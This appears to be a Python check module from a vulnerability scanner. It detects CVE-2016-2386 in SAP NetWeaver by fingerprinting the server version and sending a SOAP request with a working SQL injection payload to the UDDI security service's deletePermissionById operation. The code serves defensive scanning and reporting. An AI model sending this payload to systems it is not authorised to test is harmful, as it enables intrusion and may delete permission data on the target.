"""Agent Asteroid implementation for CVE-2016-2386"""
import re
from urllib import parse as urlparse

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from packaging import version
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "SAP NetWeaver SQL Injection Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2016-2386"
VULNERABILITY_DESCRIPTION = (
    "SQL injection vulnerability in the UDDI server in SAP NetWeaver J2EE Engine 7.40 "
    "allows remote attackers to execute arbitrary SQL commands via unspecified vectors, "
    "aka SAP Security Note 2101079."
)

DEFAULT_TIMEOUT = 90
TARGET_ENDPOINT = "/UDDISecurityService/UDDISecurityImplBean"
VERSION_PATTERN = re.compile(r"SAP NetWeaver Application Server (.*) / AS Java")
LOWER_VULNERABLE_VERSION = version.parse("7.11")
UPPER_VULNERABLE_VERSION = version.parse("7.50")

HEADERS = {
    "SOAPAction": "",
    "Content-Type": "text/xml;charset=UTF-8",
}
PAYLOAD = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:sec="http://sap.com/esi/uddi/ejb/security/">
  <soapenv:Header/>
  <soapenv:Body>
    <sec:deletePermissionById>
      <permissionId>
        x' AND 1=(SELECT COUNT(*) FROM BC_UDV3_EL8EM_KEY) or'1'='1
      </permissionId>
    </sec:deletePermissionById>
  </soapenv:Body>
</soapenv:Envelope>
"""
PERMISSION_KEYWORD = "deletePermissionByIdResponse"


@exploits_registry.register
class CVE20162386Exploit(definitions.Exploit):
    """
    CVE-2016-2386: SAP NetWeaver SQL Injection Vulnerability
    """

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = requests.get(target.origin, verify=False, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        server = resp.headers.get("server", "Unknown")
        version_match = VERSION_PATTERN.search(server)
        if version_match is None:
            return False
        target_version = version.parse(version_match.group(1))
        return LOWER_VULNERABLE_VERSION <= target_version <= UPPER_VULNERABLE_VERSION

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        try:
            resp = requests.post(
                urlparse.urljoin(target.origin, TARGET_ENDPOINT),
                headers=HEADERS,
                data=PAYLOAD,
                timeout=DEFAULT_TIMEOUT,
                verify=False,
            )
        except requests_exceptions.RequestException:
            return []

        if resp.status_code == 200 and PERMISSION_KEYWORD in resp.text:
            vulnerability = self._create_vulnerability(target.origin)
            return [vulnerability]

        return []

    def _create_vulnerability(self, target_uri: str) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "exploit-db.com": "https://www.exploit-db.com/exploits/39840"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
